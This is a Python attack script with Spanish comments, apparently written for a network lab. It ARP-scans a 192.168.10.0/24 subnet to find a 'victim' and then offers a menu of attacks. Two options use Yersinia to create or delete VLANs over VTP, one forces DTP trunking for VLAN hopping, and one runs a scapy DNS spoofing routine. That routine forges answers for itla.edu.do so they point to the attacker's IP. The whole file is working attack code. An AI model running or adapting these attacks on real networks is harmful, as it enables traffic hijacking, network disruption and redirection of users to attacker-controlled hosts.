import os
import sys
import time
from scapy.all import *
import netifaces

def get_network_details():
    """Detecta la interfaz y IP buscando en el rango del laboratorio."""
    interfaces = netifaces.interfaces()
    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        # Verificamos si la interfaz tiene IPv4 (familia 2)
        if netifaces.AF_INET in addrs:
            ip_info = addrs[netifaces.AF_INET][0]
            ip_addr = ip_info['addr']
            # Filtramos para no agarrar la loopback (127.0.0.1)
            if not ip_addr.startswith("127."):
                # Intentamos obtener el gateway, si falla ponemos el .1 por defecto
                try:
                    gws = netifaces.gateways()
                    gateway = gws['default'][netifaces.AF_INET][0]
                except:
                    gateway = "192.168.10.1"
                
                print(f"[*] Configuración Detectada: Interfaz: {iface} | Mi IP: {ip_addr} | GW: {gateway}")
                return iface, ip_addr, gateway
    
    print("[-] No se encontró una interfaz con IPv4 activa.")
    sys.exit(1)

def discover_victim(interface):
    """Escanea la red para encontrar la IP del VPCS (Víctima)."""
    print("[*] Escaneando red para detectar víctima...")
    ans, _ = arping("192.168.10.0/24", iface=interface, timeout=2, verbose=0)
    for snd, rcv in ans:
        if rcv.psrc != "192.168.10.1": # Ignorar el Gateway
            print(f"[+] Víctima detectada: {rcv.psrc}")
            return rcv.psrc
    return None

def run_vtp_attack(interface, mode):
    """Ataque VTP usando Yersinia."""
    # El ataque 1 en yersinia suele ser 'Create VTP vlan'
    # El ataque 2 suele ser 'Delete VTP vlan'
    attack_code = "1" if mode == "add" else "2"
    print(f"[*] Ejecutando Yersinia VTP Attack {attack_code}...")
    os.system(f"yersinia vtp -attack {attack_code} -i {interface}")

def run_dtp_trunk(interface):
    """Forzar Trunking."""
    print("[*] Lanzando DTP Spoofing...")
    os.system(f"yersinia dtp -attack 1 -i {interface}")

def dns_poisoning(pkt, target_domain, fake_ip):
    """Falsificar respuesta DNS."""
    if pkt.haslayer(DNSQR) and target_domain in pkt[DNSQR].qname.decode():
        spf_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNSQR].qname, ttl=60, rdata=fake_ip))
        send(spf_pkt, verbose=0)
        print(f"[!] DNS Spoofed: {target_domain} -> {fake_ip}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Error: Ejecuta como sudo.")
        sys.exit(1)

    iface, my_ip, gw = get_network_details()
    victim = discover_victim(iface)

    print("\n--- MENÚ DE ATAQUES ---")
    print("1. VTP Add VLAN\n2. VTP Delete VLAN\n3. DTP VLAN Hopping\n4. DNS Spoofing\n")
    choice = input("Seleccione una opción: ")

    if choice == "1": run_vtp_attack(iface, "add")
    elif choice == "2": run_vtp_attack(iface, "del")
    elif choice == "3": run_dtp_trunk(iface)
    elif choice == "4":
        print(f"[*] Envenenando itla.edu.do para apuntar a {my_ip}...")
        sniff(filter="udp port 53", prn=lambda p: dns_poisoning(p, "itla.edu.do", my_ip))